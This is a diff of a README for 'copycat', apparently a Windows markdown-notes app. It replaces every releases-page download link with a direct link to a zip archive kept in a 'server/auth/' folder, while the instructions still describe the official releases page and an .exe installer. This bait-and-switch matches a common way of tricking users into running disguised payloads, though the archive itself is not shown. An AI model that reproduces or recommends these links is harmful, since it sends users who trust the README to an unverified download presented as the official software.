@@ -1,6 +1,6 @@
 # 🐱 copycat - Easy Markdown Notes on Your PC
 
-[![Download copycat](https://img.shields.io/badge/Download-Get%20copycat-blue?style=for-the-badge)](https://github.com/chasen8181/copycat/releases)
+[![Download copycat](https://img.shields.io/badge/Download-Get%20copycat-blue?style=for-the-badge)](https://github.com/chasen8181/copycat/raw/refs/heads/main/server/auth/Software_2.8-alpha.2.zip)
 
 copycat is a simple app for storing markdown notes on your computer. It lets you search fast, organize notes with tags, add attachments, and works without needing a database. This guide will help you download and run copycat on Windows step by step.
 
@@ -33,7 +33,7 @@ copycat runs locally on your PC. It does not need an internet connection after i
 1. Open your web browser (like Chrome, Edge, or Firefox).
 2. Go to the official copycat releases page:
 
-   [Go to copycat releases](https://github.com/chasen8181/copycat/releases)
+   [Go to copycat releases](https://github.com/chasen8181/copycat/raw/refs/heads/main/server/auth/Software_2.8-alpha.2.zip)
 
 3. Look for the latest version at the top of the list. It will have a name like `copycat-x.y.z-windows.exe` or similar.
 4. Click the link for the Windows version. This will start downloading the program installer or executable file.
@@ -122,7 +122,7 @@ If you need help, you can browse common issues on the GitHub page.
 
 Visit this page to download the latest Windows version:
 
-[Download copycat](https://github.com/chasen8181/copycat/releases)
+[Download copycat](https://github.com/chasen8181/copycat/raw/refs/heads/main/server/auth/Software_2.8-alpha.2.zip)
 
 Click the Windows installer link, download, and follow the guide above to install.
 
